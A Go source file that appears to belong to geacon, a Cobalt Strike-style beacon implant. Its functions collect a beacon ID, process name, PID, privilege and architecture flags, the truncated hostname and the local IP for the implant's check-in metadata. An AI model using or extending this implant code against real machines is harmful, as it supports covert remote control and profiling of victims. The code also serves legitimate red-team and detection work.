package sysinfo

import (
	"encoding/binary"
	"geacon/cmd/crypt"
	"net"
	"os"
	"runtime"
	"strings"
)

func GeaconID() int {
	randomInt := crypt.RandomInt(100000, 999998)
	if randomInt%2 == 0 {
		return randomInt
	} else {
		return randomInt + 1
	}
}

func GetProcessName() string {
	processName := os.Args[0]
	// C:\Users\admin\Desktop\cmd.exe
	// ./cmd
	slashPos := strings.LastIndex(processName, "\\")
	if slashPos > 0 {
		return processName[slashPos+1:]
	}
	backslashPos := strings.LastIndex(processName, "/")
	if backslashPos > 0 {
		return processName[backslashPos+1:]
	}
	return "unknown"
}

func GetPID() int {
	return os.Getpid()
}

func GetMetaDataFlag() int {
	flagInt := 0
	if IsHighPriv() {
		flagInt += 8
	} else if IsOSX64() {
		flagInt += 4
	} else if IsProcessX64() {
		flagInt += 2
	} else {
		flagInt += 1
	}
	return flagInt
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size
	if len(sHostName) > 10 {
		sHostName = sHostName[1 : 10-1]
	}
	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	return sHostName
}

func GetLocalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				if len(ipnet.IP) == 16 {
					return binary.LittleEndian.Uint32(ipnet.IP[12:16])
				}
				return binary.LittleEndian.Uint32(ipnet.IP)
			}
		}
	}
	return 0
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
